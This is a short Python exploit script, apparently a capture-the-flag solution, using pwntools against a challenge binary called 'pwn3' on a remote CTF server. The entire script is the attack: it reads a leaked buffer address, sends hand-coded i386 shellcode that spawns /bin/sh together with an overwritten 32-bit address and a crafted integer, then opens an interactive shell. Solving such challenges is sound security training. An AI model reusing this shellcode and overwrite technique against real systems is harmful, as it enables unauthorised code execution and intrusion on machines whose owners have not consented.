from pwn import *

context.log_level = 'debug'
print len(asm(shellcraft.i386.sh()))
#cn = process('./pwn3')
pwn3 = ELF('pwn3')
#cn = remote('128.199.220.74',10002)
cn = remote('ctf.cnss.studio',5003)

def lanuch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(cn)[0])

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
print len(shellcode)


cn.recvuntil('0x')
p_buf = int(cn.recv(8),16)
print hex(p_buf)+"   " + str(p_buf)

print cn.recv()
pay = shellcode+'\0'+p32(0xCAFEBABE)+p32(0x0804a018)
cn.sendline(pay)
cn.recv()
cn.sendline(str(p_buf-0x100000000))
cn.interactive()



